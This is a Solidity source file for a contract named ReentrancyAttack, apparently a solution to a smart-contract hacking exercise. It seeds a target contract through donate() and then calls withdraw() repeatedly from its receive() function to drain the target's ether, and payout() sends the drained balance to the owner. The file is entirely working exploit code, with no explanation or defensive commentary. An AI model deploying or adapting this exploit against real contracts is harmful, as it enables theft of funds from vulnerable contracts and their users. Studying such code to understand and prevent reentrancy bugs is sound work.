// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttack {
    address payable reentrancyAddress;
    address public owner;

    constructor(address payable _reentrancyAddress) payable {
        owner = msg.sender;
        reentrancyAddress = _reentrancyAddress;

        // To avoid additional calls to donate(), donate() directly while creating the exploit contract
        bytes memory payload =
            abi.encodeWithSignature("donate(address)", address(this));
        (bool sent, ) = reentrancyAddress.call{value: msg.value}(payload);
        require(sent);
    }

    function attackWithdraw() public payable {
        bytes memory payload =
            abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
        reentrancyAddress.call(payload);
    }

    receive() external payable {
        attackWithdraw();
    }

    function payout() public {
        require(owner == msg.sender);
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent);
    }
}
